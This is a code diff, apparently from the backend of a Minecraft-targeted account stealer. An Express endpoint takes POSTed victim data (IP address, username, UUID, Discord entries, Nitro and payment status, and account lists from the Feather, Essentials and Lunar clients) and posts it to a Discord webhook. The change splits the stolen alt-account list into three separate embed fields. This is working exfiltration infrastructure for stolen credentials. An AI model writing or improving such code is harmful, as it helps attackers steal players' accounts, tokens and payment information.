@@ -215,8 +215,6 @@ app.post("/", (req, res) => {
             lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username);
         }
 
-        const alts = `Feather Accounts: ${featherAccounts.join('\n')}\nEssentials Usernames: ${essentialAccounts.join('\n')}\nLunar Usernames: ${lunarAccounts.join('\n')}`;
-
         try {
             post(webhook, JSON.stringify({
                 content: content, //ping
@@ -230,10 +228,12 @@ app.post("/", (req, res) => {
                         {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
                         {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
+                        {name: 'Feather Accounts:', value: `\`\`\`${featherAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Essential Accounts:', value: `\`\`\`${essentialAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Lunar Accounts:', value: `\`\`\`${lunarAccounts.join('\n')}\`\`\``, inline: true},
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                         {name: 'Lunar', value: `${checkLunar}`, inline: true},
-                        {name: 'Alts', value: `\`\`\`${alts}\`\`\``, inline: false},
                         {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
                         {name: 'Nitro', value: `\`${nitros}\``, inline: true},
                         {name: 'Payment', value: `\`${payments}\``, inline: true},
@@ -264,10 +264,12 @@ app.post("/", (req, res) => {
                         {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                         {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                         {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
+                        {name: 'Feather Accounts:', value: `\`\`\`${featherAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Essential Accounts:', value: `\`\`\`${essentialAccounts.join('\n')}\`\`\``, inline: true},
+                        {name: 'Lunar Accounts:', value: `\`\`\`${lunarAccounts.join('\n')}\`\`\``, inline: true},
                         {name: 'Feather', value: `${checkFeather}`, inline: true},
                         {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                         {name: 'Lunar', value: `${checkLunar}`, inline: true},
-                        {name: 'Alts', value: `\`\`\`${alts}\`\`\``, inline: false},
                     ],
                     color: 0x7366bd,
                     footer: {
